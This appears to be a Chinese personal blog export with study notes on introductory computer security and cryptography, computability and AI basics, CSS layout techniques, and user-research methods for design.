攻击类型：针对以上三个安全目标，分别有3大类的攻击 机密性：嗅探、流量分析 完整性：修改、假冒、重放、抵赖； 可用性：拒绝服务（例如 Dos） 安全技术：密码术、隐写术 机密性 类型：对称密钥、非对称密钥； 对称密钥密码术 传统式：面向字符 替换密码：用一个符号替代另外一个符号； 单字母密码：例如加法密码（移位密码或凯撒密码）-明文、密文和密钥都是模26中的整数；注：这种加密方式可以统计字符频率来破解； 多字母密码：字母的每一次出现都使用不同的替换密码，因此一个字符将会对应多个字符，这多个字符组成了一个集合，称为子密钥流； 例如：自动密钥密码，约定第一个子密钥流的替换字符，然后第2个替换字符基于明文的第1个字符，第3个基于明文的第2个字符，以此类推； 移位密码：通过改变符号的位置来实现加密，而不是通过替换；相当于给字符重新排序了； 流密码：加密和解密一次只对应一个符号（一个字符或者一个位）进行，因此有明文流、密文流和一个密钥流组成； 分组密码：以组为单位，整个分组单独使用一个密钥；密文分组则取决于明文分组 组合密码：局部分组+整体流； 现代式：面向位（原因：数据的种类变多了，包括图片、声音、视频等；另外，由于一人字符会替换8位或16位，由于混淆的数据变成8倍大，即使用旧的方法，也变得更安全） 分组密码：以 n 个位为分组的单位（多拆少补）进行分组加密；常用的 n 包括：64，128，256， 512 等； 流密码：跟传统的流密码原理相同，只是字符改成了位； 非对称密钥 与对称密钥的区别 场景：对称密钥面向多个共享秘密，非对称面向个人保守自己的秘密；非对称还可以用于数字签名和身份验证； 操作：对称基于字符的排列或替换；非对称基于数字的函数运算； 非对称通常用来加密或解密小段信息（原因：对于长消息，对称密钥术速度要快，非对称则比较慢，因此它使用指数和模计算，当数字比较大时，计算非常费时） 其他安全服务 消息完整性：信息是公开的，但不能被篡改（例如遗嘱） 消息和消息摘要 可以类比于文档和作者的指纹；如果有人伪造文档，但文档上面的指纹不符，则可以查出来； 通过散列函数，从消息中，生成消息的压缩版本，即摘要；如果消息有变更，则压缩出来的摘要会不同；（摘要需要通过不可篡改的渠道进行传输，避免传输过程中摘要被改了） 散列函数 MD：消息摘要，message digest；MD5 可以将512位的消息生成128位的摘要（目前发现128位太短，不够安全，因此发明安全散列算法 SHA 算法来改进它） SHA：安全散列算法，secure hash algorithm； 消息验证 MAC：消息验证码，message authentication code，通信双方拥有一个只有他们自己知道的 K 密钥，消息使用 K 密钥生成 MAC，然后将 M 和 MAC 一起传输给接收方（可以使用不安全通道）；接收方收到消息后，使用 K 密钥将 M 生成 MAC ，再与收到以 MAC 进行比对，如果正确，说明消息没有被改；如果错误，说明已经被改过； HMAC 是新一代的消息验证码标准； 数字签名 数字签名使用一组公私钥，发送者使用私钥为发放的消息生成签名，签名随同消息一起发送；接收者使用公钥对签名进行计算，判断签名是否来自真实的发送者；（注：这一过程和非对称数字加密正好相反）（再读一遍的时候，感觉没有相反啊，顺序正好相同） 每条消息生成的签名不同，它是根据消息内容计算出来的； 考虑到非对称密钥的性能不高，对于长消息的场景，可以考用统一的散列函数生成摘要，之后再对摘要使用签名，这样就可以避免速度慢的问题； 不可抵赖性 通过引入公正可信的第三方，来解决不可抵赖性的问题 过程：消息发送者将消息发给第三方，第三方验证消息无误后，保存副本，然后使用自己的私钥重新加密消息，并发给接收者；由于第三方做了验证的工作，如果将来发送者要抵赖，第三方可以根据保存的消息副本进行举证； 实体验证 使用三种证据：所知道的（例如密码），所拥有的（例如身份证），所固有的（如指纹） 验证分类： 密码：不安全，因为密码很容易被破解，例如在传输过程中； 挑战-回应：通过回应挑战，证明自己拥有密码； 密钥管理 对称密钥分发 密钥分发中心（Key Distributed Center）： 使用可信的第三方，解决由于人数增加带来的密钥分发问题，不然密钥数量会上升到 n * (n - 1)； 过程：A 通知 KDC 请求要与 B 通信，KDC 通知 B，如果 B 同意，则 KDC 生成一个密钥，发给双方，双方使用这个临时的密钥建立通信；（如何确保KDC 传输密钥给 A&#x2F;B 的过程是安全的，避免密钥被中途截获？貌似这涉及 KDC 与 A&#x2F;B 的通信加密，需要使用加密通道） 多个密钥分发中心：由于全球用户数量多太，按地区划分成多个区域，每个区域设立一个 KDC ，当有用户需要跨区通信时，中间就由两个或多个 KDC 建立起连接； 会话密钥：KDC 给每个成员签发一个密钥，用来建立成员和 KDC 之间的安全通信；如果 A 想和 B 通信，就向 KDC 发起请求；KDC 返回一个临时会话密钥，A 可以用自己的密钥打开，B 也可以用自己的密钥打开，这样 A B 就都获得了这个临时的会话密钥；如果双方有任何一方的身份不真实，他们都无法打开取得会话密钥； 公钥分发 引入认证机构 CA ( Certificate Authority）， 首先每个用户在 CA 的数据库里面有一个公钥； CA 有一个众所周知的公钥，如果 A 想和 B 通信，可以利用这个公钥给 CA 发送请求， CA 使用自己私钥解密查阅请求，然后从数据库中找出 B 的公钥，加密后发给 A，A 收到后，使用该 B 的公钥给 B 发消息即可；这样就可以解决公钥骗局的问题，确保 A 收到的 B 的公钥是真实的；(貌似这个就是常用的 SSL 证书的方式，用户 A 向证书颁发机构申请一份证书，里面有私钥也有公钥，私钥自己保存，公钥 CA 保存；任何想与A 通信的人，使用 CA 的公钥发送请求，这个请求只有 CA 能够查看，CA 收到请求后，将 A 的公钥发给申请人，然后申请人用这个 A 的公钥与 A 进行加密通信，确保消息只有 A 能够查看；当然，此处还有一个问题，对于 A 发给 B 的消息，虽然是加密的，但由于 A 的公钥是公开的，所以所有人都可以查看，仍然不够安全，除非 B 也有申请一个自己的公钥，让 A 对消息进行加密）（对于移动客户端，由于开发者可以控制移动端的代码，可以自行引入公私钥加密方法，即每个客户端有自己的私钥，然后服务端使用对应的公钥对消息进行加密，只有真正的客户端收到后才能解密，对于伪造的客户端，无法解密） 如果每个用户在 CA 的数据库中的公钥的格式都不同，则会带来很大的麻烦，因此通过 X.509 引入证书的标准格式，解决格式不同的问题；避免 A 收到 B 的公钥后，读取不出数据； 防火墙：允许一些数据包和阻止另外一些数据包的动作； 包过滤防火墙：基于网络层的信息和传输层的头部信息，来定义过滤规则； 过滤选项包括：源 IP，源端口，目标IP，目标端口等； 代理防火墙：也叫应用网关，gateway 原理：基于消息自身携带的信息进行过滤（即是基于应用层，需要打开数据包，查看数据是否合法，如果合发，再转给真正的服务器进行处理） 计算理论 引言：本章介绍三个东西，分别是：简单语言、图灵机、任何程序无法知道其他程序是否终止的证明； 简单语言 只有三个语句，分别是递增语句、递减语句、循环语句，通过这三个语句，基本上可以模拟出相对复杂的语言（例如 C）（但执行效率会差很多） 宏：等价于一条语句或多条语句的特定集合；类似于函数，可以重复使用，但与函数的不同在于，没有局部作用域； 图灵机 图灵机由三个部分组成，分别是磁带（此处假设空间无限）、读写头、控制器； 控制器：一个存储有限状态的自动机，即如果：处于当前状态-&gt;如果读到什么-&gt;就写入什么-&gt;然后转移到哪里-&gt;最后调置一个新的状态（这样就可以实现无限的循环了） 当有了控制器并设置相应的有限状态后，我们就可以对前面的简单语言进行模拟，包括递增、递减和循环； 邱奇-图灵问题：如果存在一个算法，可以使用符号来完成任务操纵，那么也存在一个可以完成这个任务的图灵机； 歌德尔数 语言是由符号组成的，而符号可以数字来约定替代，因此，程序可以使用数字来表示； 停机问题 停机问题是无法解决的，即我们无法编写出一个程序，去检测另外一个程序是否会停止下来； 问题的复杂度 不可解问题 不可解的问题有很多，可以考虑使用反证法进行证明，即如果它是可解的，是否也会导致停机问题也可解； 可解问题 问题的复杂度，可以用相对输入的计算次数量级来表示，即大 O 表示法 对于 O(log n)，O(n), O(n2), O(n3), O(n4)：当输入在100万以内时，多项式问题可以解决； 对于 O(10n)，O(n!)：当输入小于100时，可以解决；如果输入很大，可能要算上很长时间，例如几个月，才能有结果； 人工智能 引言 定义：人工智能是对某种程序系统的研究，这种程序系统能够在某种程度上模仿人类的一些行为，例如思考、学习、感知和反应等； 图灵测试：给一组问题，由AI 和真人各给出答案，如果无法辨别答案是由谁给出的，表示通过测试； 智能体： 软件智能体：一组用来完成特殊任务的程序； 硬件智能体：一个用来完成各项任务的可编程系统； 编程语言：专用的有 LISP 和 PROLOG 两种 知识表示 将知识表示成某种数据结构，然后程序可以对其实现操纵； 4种常见的知识表示方法 语义网：使用有向图表示知识，有向图由顶点和边组成；顶点表示概念，边表示概念之间的关系； 框架：相对于语义网使用图来表示知识，框架则使用数据结构来表示相同的知识，计算机更容易处理数据结构；框架由对象和槽组成；对象表示某种事物或概念，相当于语义网中的节点，槽定义了关系的类型和值； 谓词逻辑 命题逻辑 运算符：与，或，非，如果…那么，当且仅当； 句子 推理：从已知的事实中，推导新的事实；当找不到反例时，推断就是合法的； 谓词逻辑：谓词逻辑可以定义命题之间的关系；在谓词逻辑中，句子被分成谓词和参数（谓词很像编程中的函数，是个动词）； 句子： John’s father loves Ann’s sister，表示为 love [father (John), sister(Ann)]，eat [I, apples]（感觉很像可以转换成树，动词做为 root 节点） 量词： 全称量词“所有的”：变量所表示的全部对象的某些事为真； 存在量词“存在”：变量所表示的一个或多个对象的某些事为真； 超谓词逻辑 高阶逻辑：扩展了量词的范围，使其能够表达更复杂的关系 默认逻辑：假设诊断的默认结论都可以被接受，直到出现反例； 模态逻辑：用来表达 could, may, should 的情形； 时态逻辑：用来表达 from now on, at some point of time 的情形； 基于规则的系统：使用规则来表示知识，根据规则，可以从已知的事实中，推导出新的事实； 组成 知识库：即规则库 事实库 解释器：即推理机，可以根据知识库和事实库的输入，推导出新的事实； 正向推理：解释器使用一组规则和一组事实，来执行一个行动； 反向推理：先定目标，然后查事实库，如果目标在事实库存在，推理结束得出结论；如果不存在，查规则库与目标对应的规则，然后验证该规则涉及的事实（进入循环迭代） 专家系统 抽取知识：从专家身上抽取知识；这个过程并不容易，一般由专门的知识工程师来执行； 抽取事实：收集事例和数据，以便后续可以被推理机使用； 体系结构：由用户界面、推理机、解释器、知识库编辑器、知识库、事实库组成；其中前4个是可以通用的（意味着可以做成框架库），后2个是需要根据实际场景进行搭建的； 感知 人类有五官，即5种感知器官，包括视觉、听觉、触觉、嗅觉、味觉；其中前2个计算机已经可以实现，后面3个还有待研究； 图像处理 边缘探测：由于边缘部分存在较大的反差，因此可以通过高通滤波器来查找边缘； 分段：将图像分为不同的区域，每个区域内部是同构的； 查找深度 立体视觉：通过使用两只摄像头来实现，原理就像人类的眼睛一样； 运动：当图像中的物体发生移动时，根据单位移动的幅度，也可以判断出物体的远近； 查找方向 光照：假设物体表面的物理特性相同，则根据其反射为光线的数量，可以判断物体的方面； 纹理：假设物体表面存在规则或重复的纹理，则也可以用来判断方向； 对象识别 为所要识别的物体，在数据库建立对象模型； 将物体视为由多个简单的几何形状组成；在识别对象时，将对象进行分解，如果分解后的结果与存储的组合匹配，则对象被识别； 应用：可以使用在制造业的流水线上，此时需要检测的目标数量有限，环境相对简单可控，可以取得比较理想的效果； 语言理解 语音识别：根据语音信息的输入，抽取单词序列做出输出； 语法分析 良好定义的文法； 词法分析器：基于文法规则建立一棵词法分析树，来判断一个句子的合法性； 语义分析：在语法分析的基础上，得到句子的意思；意思可以用前面的知识表示规则进行表示，例如使用谓词逻辑等； 语用分析：进一步明确句子的用途和消除歧义； 意图：例如告知、请求、询问、承诺等； 消除歧义：排解一些毫无道理的句子，例如 John eat the ocean; 搜索 用状态集合求解问题；有一个初始状态，然后通过多个中间状态，最后到达一个目标状态；例如8数字拼图游戏（9个格式，8个数字，1格为空；目标状态为1~8顺时针有序排列，中间为空） 搜索方法 蛮力搜索 广度优先 深度优先：在走迷宫的时候，深度优先的方法，一般比广度优先的方法效率高一些； 启发式搜索 给每个节点赋一个启发值，该值用来表示节点当前的状态，与目标状态的距离； 开始搜索时，我们遍历下一层所有的状态，以及它们的启发值，然后从最小的启发值的下一个状态开始搜索； 神经网络：使用神经元网络去模拟人脑的学习过程； 生物神经元：由神经细胞体、树突（接收输入）、轴突（发送输出）、神经键（与其他神经元的连接点）组成 感知器：类似一个神经元细胞，它接收一组输入（带权重），对输入进行求和，如果结果大于阈值，则触发输出；如果小于，则抑制（没有动作）； 多层网络：将多个层次的感知器组合起来，可以形成多层网络，每一层的输出，成为下一层的输入；第一层为输入层（它们不是神经元，是分配器）、中间层为隐藏层（给上一层的输出加上权重）、最后一层为输出层； 应用：如果有足够数量、预先定义的输入和输出时，就可以定义神经网络，目前在两个领域得到很好的应用，一个是信用赋值（为每个人建立信用等级）、一个是 OCR 字符识别；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}]},{"title":"CSS","slug":"CSS","date":"2015-12-15T01:47:00.000Z","updated":"2024-09-22T04:04:28.926Z","comments":true,"path":"2015/12/15/CSS/","permalink":"http://example.com/2015/12/15/CSS/","excerpt":"","text":"可以通过display:none来控制一个元素从界面上面消失，而且是纯的消失，不再占用任何空间；如果是只是隐藏，可以通过visibility: hidden来控制； 可以通过display: inline将li元素转成横向排列，我发现它对顶部导航的水平菜单可能很有作用；（经测试发现，需要弄成display: inline-block才能控制高度和宽度，inline只是内联元素，inline-block是块元素）（对所有的块元素应该都适用，而不仅仅是li；另外内联元素不能控制高度，也不能控制宽度和margin&#x2F;pading的top&#x2F;bottom）（内联元素的内容是否自动垂直居中？可以，但不能设置高度，所以没用） 可以通过width:定宽和margin：0 auto的配合，来让一个块级元素在浏览器窗口中进行居中（这个居中是整个块在屏幕的水平居中，不包括文字，如果要加上文字部分，还得加一个text-align: center）；但如果浏览器小于定宽值，会导致出现水平滚动条，这种情况可以用max-width来替代width，就可以避免水平滚动条的出现了； 这个功能对于手机浏览器这种小尺寸屏幕的设备特别有用；(max-width的意义是给块指定了最大的宽度，但没有限制最小的宽度，这样一来，当浏览器窗口比较小时，它就会自动跟着缩小） 盒模型中的width其实是指设置内容的宽度，不包括内边距和边框的宽度，当后两者有值时，实际盒模型的宽度会比width的值来得大；不过呢，可以通过box-sizing: border-box来解决，但是为了兼容safari和firefox，需要加以下两段：-webkit-box-sizing: border-box和-moz-box-sizing: border-box;（看英文的意思，大概翻译一下好，盒子尺寸：以边框为界，我觉得这个作用挺好，因为它比较符合常规的认知，另外需要在开头直接设置所有元素，用*{}） 所有元素的默认position为static，所以static表示不对这个元素做任何定位措施；（那意思应该是按默认的流模式了） position: relative的意思是指相对它原来的位置进行的偏移，使用top&#x2F;left&#x2F;bottom&#x2F;right来指定偏移的值（偏移后原位置会留白，没有人会故意移动来填补空缺）（relative如何不赋值的话，它的表现就是static，但是又不一样的地方是，此时它是一个有position身份的元素了，它的子元素如果想做绝对定位的话，就可以根据它的位置来定位，但如果它是static就不行，它的子元素就会跳过它找上一级） position: fixed的意思是指元素将相对于页面进行固定定位(确切的说是相对于body元素来定位的）（固定的意思是它不会随着滚动条进行移动）（而且，它移走后其他元素会来填补它的空缺位置）； position: absolute是一个比较特殊的定位，它是相对于它最近一级有定位值的祖先元素（如果所有的祖先元素都没有定位，那它最后就只能追随body这个祖宗来定位了） 的级别好像很低，下一级好像不能再放块级子元素了；（经百度后证实果然没错，p内部只能装内联元素了，再放块级元素会出错） float: right&#x2F;left，主要用来实现文字环绕图片，如果文字段落的高度还没有图片高，那么可以使用overflow: auto来搞定；如果老旧的浏览器不兼容这个CSS属性的话，可以再加上zoom:1来解决；overflow跟float配合在同一个元素中使用的，而不能放到父元素中去；另外float是在父元素的容器中进行浮动；（float好像可以用来放置展示图片，如dribble那种样式？） 容器的width使用百分比来表示的话，会使得容器中的内容相应的根据浏览器窗口的大小，来缩放大小，经常用于图片的显示效果调整；（难道百分比不是相对父容器？待查证）（经查证是相对父容器） 对于屏幕很小的移动设备浏览器来说，可以使用@media screen and (min-width: 600px){} 和 @media screen and (max-width: 599px) {}来使得内容变成纵向排列；前者控制在设备最小宽度为多少时，布局应该呈现什么样子的；后者表示当设备最大宽度为多少时，布局应该呈现什么样子的；类似于if…else…，是一个判断语句；（这个大括号是要括住所有的css代码吗？不是，而是括住在该条件下生效的代码） display: inline-block的几个注意事项： vertical-align的属性会影响到inline-block的表现（如果有好几个inline-block的话，vertical-align会按照高度最大的那个block来进行居中对齐）（这个属性可以用来神奇的对图片在容器中设置垂直居中）； 需要设置每一列的宽度（不设置的话，就会换照内部的文字内容自动取宽度；如果没有文字内容，那么它就不显示出来了） 如果HTML源代码中元素之间有空格，那么列与列之间会产生空隙（经试验好像没有发现这个问题，暂时搞不清楚怎么重现它）(现在我发现了，原来换行也算是一种空格，所以导致正常情况下inline-block的元素间肯定会有间距，除非去掉换行，但这样会影响代码的可读性，也搜索了一些其他的方法，都没有非常完美的解决方案）（后来我找到了完美的解决方案，它就是即将出场的flex）； 如果要使文字呈现多列布局，可以考虑使用column-count和colomn-gap，假设要搞成3列，那么column-count:3; column-gap:1em;（由于这个属性比较新，所以，老规矩，加上-webkit和-moz，以确保兼容性） 接下来要出场的是一位牛逼的布局高手：display: flex;接下来写两段示例 父元素{display:-webkit-flex; display:flex;} 子元素{-webkit-flex: initial&#x2F;none&#x2F;1&#x2F;2} align-items:center; justify-content: center; 算了，功能很强大，看下面这个链接中的详细教程：FLEX布局， Flex语法 不管容器内是块元素或行内元素，flex都适用； 可以通过{line-height: 等于所在块高度}来实现块内文字（确切的说是内联元素，包括span）的垂直居中对齐；（如果行内元素有设置高度，那么需要再配合使用vertical-align来使得行内元素本身的文字居中对齐）（疑问，行内元素可以设置高度吗？回答：不可以） HTML5增加的一些新元素，有利于定义内容： 大的：header&#x2F;footer&#x2F;nav&#x2F;aside; 小的：section&#x2F;article 如果想设置一个元素满屏，首先得确保它的父元素能够满屏，不然正常情况下它的100%高度等于父元素的高度；如果网页是满屏布局的，如evernote，则可以一开始直接设置body的高度为100%； h1~h6跟div的使用情况竟然是不一样的，我用h2&#x2F;h5来表示文字，然后用绝对定位一直出现不了想要的效果，于是改成了div，结果就OK了，为什么它们的展示效果是不同的呢？ 可以通过overflow:scroll来展示滚动条，或者overflow:auto用来当溢出内容时显示滚动条； 如果想让一个div占据上一级div减去头顶上一个div的余下高度，可以很巧妙的通过postion:absolute来解决，将top设置为顶上div的高度，bottom设置为0； 使用绝对定位的时候，需要指定宽度，不然默认宽度为0； text-overflow:ellipsis 当内容超出div宽度时，显示为”…”，同时需要配合overflow:hidden和white-space:nowrap进行使用； white-space:nowrap控制文本单行显示不折行； BOX默认在占据父元素的整个宽度，所以不需要特别加width:100%,否则会引起一些奇怪的麻烦，比如出现不应该出现的水平滚动条； 如何解决给行内元素设定宽度的问题？通过display:inline-block来实现； 通过box-shadow来设置阴影，语法box-shadow: 4px 4px 6px #888888（水平偏移，垂直偏移，阴影长度，阴影颜色）；如果要四个方向都有阴影，则水平和垂直偏移设置为0，然后设置相应的阴影长度即可； 由于行内元素不能设置宽度，所以如果出现要设置宽度的情况，建议还是采用div+ display:inline-block的方法来实现好了；不然行内元素和块元素放在一行时，会产生奇怪的对齐问题； 可以通过:hover来设置鼠标悬停的样式； 可以通过A元素的:hover+B元素的类组合的复合筛选，来实现当鼠标悬停A元素时B元素的样式出现变化； 图片的等比缩放显示：父元素div指定长宽及text-align:center后（水平居中），子img元素再设置max-width和max-height以及verticle-align:middle来垂直居中即可； 绝对定位的元素可以设置z-index，数值越大，表示叠在最上面，有时候一些悬停效果没有按预期实现，有可能是这个绝对定位的元素被其他元素遮住了； 如何设置两个并排挨在一起的按钮： 一种方法是通过display:inline-block，同时2个div间不换行无空格来实现（以便使两个按钮没有间距，不然display:inline-block会默认有间距）； 第二个方法：暂时没想到； 可以通过大于号&gt;，例如div&gt;p，来只选择下一级的某一种类别的子元素，不选到孙元素的层级； title&#x3D;”文字内容”，可以用来显示鼠标悬停时的提示文字； 换行后，前后的文本是否仍然算是在同一个行内？是的，并没有创建一个新的块； 块内有两行文本，如何让它们垂直居中？设置上下的padding值一样即可；（但此方法也有局限性） 如何做自适应的布局？ 可以通过HTML中注明不同的屏幕尺寸下，选择性加载不同的CSS文件，以达到自适应布局的效果； 也可以通过在CSS文件中备注不同的@media screen and (max-width: 40rem) 规则来实现； img{max-width:100%;}可以实现图片的自动缩放； 网页宽度自适应：； 宽度和字体使用相对值，不使用绝对值，如px； 用float来布局，这样当宽度不足时，元素会自动移动到下一行； 配合flex估计可以实现很好的效果，待实践一下；(经证实用flex-wray: wrap 加上设置item的最小宽度及等比缩放flex:1后即可实现）； 伪类first-child需要指定元素名，例如：.类名&gt;span:first-child（其中span记得不能省略）； box-shadow: h-shadow（水平） v-shadow（垂直） blur（模糊程度） spread（阴影的远近，会影响大小） color（阴影的颜色） inset（内部阴影）; font-weight 如果用数字表示的话，400等于normal无加粗，700等于bold； 用和子元素来创建下拉列表； background-size:contain可以将背景图像设置在容器的包含中；即背景图像扩展至最大，但高度和宽度刚好适应并完整显示中容器中； 图片如何实现按固定大小截剪? 链接去掉下划线：a{text-decoration:none} 有必要了解一下input的各种类型，以及他们的样式处理；（注：input是一个空元素，不需要结束标签） 搜索框 type&#x3D;”search”； 文本输入框 type&#x3D;”text”； 按钮 type&#x3D;”button”; 多选框 type&#x3D;”checkbox”;用name&#x3D;”相同的值”来归类为同一组； 单选框 type&#x3D;”radio”; 用name&#x3D;”相同的值”来控制这一组按钮单选； 上传文件 type&#x3D;”file”； 隐藏字段 type&#x3D;”hidden”；隐藏字段用户看不见，但会存储一个默认值；这个值可以通过JS来修改，实现某些目的； 密码 type&#x3D;”password”；输入密码时会显示星号； 重置按钮 type&#x3D;”reset”；点击后会清空表单中的所有数据，好像是清除哪个表单？经测试，只会清除当前父元素form底下的表单数据； 提交按钮 type&#x3D;”submit”； 悬停划出抽屉； “utf-8 无bom”两种格式编码，会导致IE或者EDGE的浏览器产生乱码，需要改成“utf-8”才能显示正常； chrome的最小字体大小是12px，所以设置body的font-size：62.5% 并没有真正实现效果，后台仍默认为12px，而不是预期的10px; 我在考虑既然62.5%不能有效，或者直接按100%即默认的16px？","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://example.com/tags/CSS/"}]},{"title":"设计调研","slug":"设计调研","date":"2015-11-30T14:20:00.000Z","updated":"2024-09-22T23:08:43.588Z","comments":true,"path":"2015/11/30/设计调研/","permalink":"http://example.com/2015/11/30/%E8%AE%BE%E8%AE%A1%E8%B0%83%E7%A0%94/","excerpt":"","text":"第一章 数据采集1.1 观察法 几个属性： 布景：人工布景模拟真实环境，或者直接在真实环境中观察； 结构： 开放式：没有限制和采取任何提前措施，直接观察并记录； 结构式：先预观察，然后分类，之后大量观察前，对用户进行分组培训，再观察统计； 公开性：用户是否知道自己在被观察；不知道最好，但有时需要用户配合，不可避免需要让用户知道； 参与水平：观察人是否介入事件中； 步骤： 明确观察方向：观察谁，观察什么事，在什么环境下观察； 观察的准备：选择观察对象，观察地点（实地，或者实验室）； 观察框架：该观察什么，怎么记录，后期如何整理分析； POEMS： PEOPLE, OBJECTS, ENVIRONMENT, MESSAGE, SERVICES; 预观察：1~2个预观察可以提高后续大批量观察的效率； 进行观察：看、听、问、思、记； 整理分析：观察后越快整理越好，因为记忆更加鲜活； 优缺点：信息量大，数据真实性高；成本高，耗时长；1.2 单人访谈法 通过访谈可以了解到用户的思考过程，这是观察法所无法做到的；另外还可以了解用户的观点和看法； 访谈结构：介绍（访谈的目的）、暖场（让对方放松）、一般问题、深入问题、回顾与总结（段落间）、结束语与感谢； 访谈问题类型（一般是两种结合使用） 结构化问题（询问结果可以直接作为选择题目的答案）； 开放式问题（无固定的回答格式）； 访谈技巧： 主持：随和、不主观偏见； 提问方式：开放式，不引导； 倾听与回应； 重复与释义； 跟进与深挖； 访谈环境：注意双方的座位安排形成谈话气氛，环境不大不小，目的是放对方感到放松； 步骤： 确定目标被访者：明确研究的目的，提出基本的问题，之后整理筛选条件； 挑选目标群体； 安排日程和发出邀请； 做好充分的事前准备：仔细检查每一个细节，包括时间、材料、设备等； 常见问题及解决办法：找不到人（发动关系网）；找错人（多找一定比例的额外人员）；失约（让邀请显得正式）；迟到（预留一定的机动时间）；隐私保护（做好资料存档）；1.3 焦点小组 特点：某一个主题，结构化的方式，揭示用户的经验、感受、态度、愿望和理由； 优点：由于人多，之间可以互相启发，有利于发现用户的愿望、动机、态度和理由；不同用户的观点可以碰撞，获得直观对比； 缺点：多用于探索需求、态度为主，结论多以描述用户的看法和感受为主；故主要用于定性，而较少用于定量；群体之间会相互影响； 步骤：介绍（座谈的目的）、访谈规则（表达真实想法、无对错、围绕一定的问题开展、依次回答如有补充需等待他人发言完毕、控制过程和时间） 座谈的不同目的和类型： 挖掘需求型：开放式问题，让用户在轻松的氛围中，描述自己的生活场景，诉说自己的喜好和痛点，表达自己的想象和建议； 验证结论型：收集用户相互碰撞思想和对话之后的建议； 竞品对比型：比较结构化的访谈大纲，以便可以针对竞品之间的不同点做出比较选择，获得相关评价和讨论； 访谈大纲： 通过确认好的主题确定板块结构：比如一般问题+深入问题； 撰写合适的问题； 分配问题的访谈时间； 准备材料、工具、设备； 如果需要，设计试前问卷和试中问卷； 访谈技巧：平均分配、鼓励引导；提供思考时间，不要主导； 访谈记录办法：观察、助理研究员、做笔录、影音、允许用户追加补充问题； 数据整理：材料和数据的分类、准备数据表格、补充遗漏； 常见问题： 意见领袖（控制他的影响，注意数据质量）； 隐藏想法（鼓励表达、优先发问）； 争论（对事不对人，不分对错，适时打断情绪激动者）； 数据遗漏（边记录边核查原有的问题清单并提醒主持人）； 1.4 问卷法 分类： 结构问卷（问题具体&#x2F;回答快&#x2F;易统计，但限制多）；非结构问卷（限制少&#x2F;内容丰富，但难分析）；半结构问卷； 代填问卷（街访&#x2F;电话时使用）；自填问卷（邮寄&#x2F;网络&#x2F;报刊）； 问卷结构：介绍语、指导语、问题+答案、编码（方便后续统计分析）； 问题设计： 开放式问题：问题+空白； 封闭式问题：问题+答案； 后续性问题：类似选择式展开的模式； 问题设计注意事项： 必须非常非常明确研究的目的； 问题应当具体，不能抽象笼统； 避免出现复合型问题，此情况建议拆成两个问题； 问题通俗易懂，用尽量简单的语言，少出现专业术语； 避免倾向性和诱导性问题； 不用否定式提问； 不提敏感性或威胁性问题； 敏感问题注意适度模糊、转移对象、采用假定法、提供背景信息或辅助信息； 题目数量：尽量在20分钟内可以答完；如果以结构方式询问，并给予一定报酬或礼品，回收质量会比较高； 问题顺序：先易后难，先简后繁，先事实后主观；同类主题的内容放在一起，方便思考连续性；逻辑验证问题要隔开，避免干扰； 答案设计：是非型、选项型、排序型、等级型、模拟线性型、视觉模拟型； 问卷调查实施： 人数选择按一定比例多于需要的研究对象；（因为回收率的问题） 前期摸底，有利于提高设计的质量； 设计初稿可采用卡片法和框图法； 通过初稿的试用反馈来改进问卷设计质量； 优点：不受空间限制、方便分析、可减少偏见和误差、匿名性、省时省力省钱、短期内可收集大量反馈； 缺点：获得的信息有限、调查样本影响质量、回收率可能不高、难以了解用户的意图和动机以及思维过程（观察法也一样）；1.5 头脑风暴法 以收集创意为目的，召集一批有知识素养和不同专业背景的成员，进行集体讨论，相互启发和激励； 常见方法： 默写式：653模式，6个人，5分钟，3个想法；每人发3张纸，5分钟内在每张纸上各写1个想法；之后传给下一人，进行下一个5分钟；（大家可以有时间静静思考，避免争着发言导致设想遗漏）； 卡片法：每人在自己的卡片上写下设想，之后向大家介绍；大家在倾听后进行讨论，之后在原有卡片上进行设想补充（此方法更侧重对想法进行论证，完善可行性） 电子法：让大家可以同时在电子板上面录入，避免了卡片一次性只能一个人在填写的物理局限性；（感觉像群聊） 专家函询法：找20名左右的专家，发函询收集设想，之后进行整理设想，隐去姓名；再发第二轮函询；一般发4-5轮；可以减少权威意见的影响力，弱化表达能力的限制，避免随大流； 操作流程： 会前准备：确定议题和任务目标；找5-10名参与人员；准备场所&#x2F;设备（录音摄像）&#x2F;记录人；必要的话，进行会前训练（用其他有趣的议题模拟演习一下，针对出现的问题，提前引导大家采用正确的方式）； 实施阶段：议题通报，回答疑问；第1轮的轮流发言，记录整理；第2轮的轮流发言，记录整理；中场休息，调节气氛，如唱歌，吃零食等；在预定的结束时间，给大家1分钟补充想法，如果没有新设想，则宣告结束； 成果整理：可以采用思维导图的工具；会中整理&#x2F;会后整理&#x2F;成果报告； 原则： 自由发散：营造轻松氛围，鼓励天马行空； 主题聚焦：如果有跑题，记得及时拉回； 以量求质：多设想，多思考，暂不考虑实现成本； 延时评判：不对任何设想做任何评价； 优点：自由气氛及小组讨论带来的共振效应激发更多的设想产生；由于不考虑成本，可以尽量排除折中方案； 缺点：产生式阻碍；评价焦虑；社会惰化；认识干扰；1.6 自我陈述法 用户对自己的使用过程和使用经历的回顾和描述；比较适用于产品上线后的反馈收集； 特点：不干预、用户主动反馈、在使用场景中进行思考；一般是主动性较高的用户； 原则：让用户在轻松的氛围中完成反馈，形式不限，在线反馈亦可，语音反馈亦可； 反馈表的三个层次： 对整体印象的评价； 对主要功能进行排序，标识出最有帮助或最易操作的功能； 在既定的业务场景中的专业问题反馈； 优点：维持了用户的自然使用状态；用户可以在较长时间内自主使用产品；反馈都在积极主动的前提下反生，数据较真实可信； 缺点：由于形式不限导致内容可能分析困难；反馈时间不好控制；时间和内容的不确定性导致较难用于系统性的调研；1.7 现场试验法（感觉A&#x2F;B测试法也可以归类到这里） 优点：由于控制了自变量，可以看出变量之间的因果关系； 缺点：现场背景较难把握，成本及花费可能较高； 定量试验的步骤： 拟定并提出研究假设； 选定试验对象； 决定需要操纵的试验变量及确定所要观察的变数； 设法排除无关的变量； 使用恒定的测量工具和人员进行测度； 选择适当的统计方法进行分析； 定性试验的步骤： 准备工作：选择测试者进入现场的身份&#x2F;方式&#x2F;途径；列好观察与访谈的提纲；预告安装摄像头或麦克风； 取样：挑选合适的受试者； 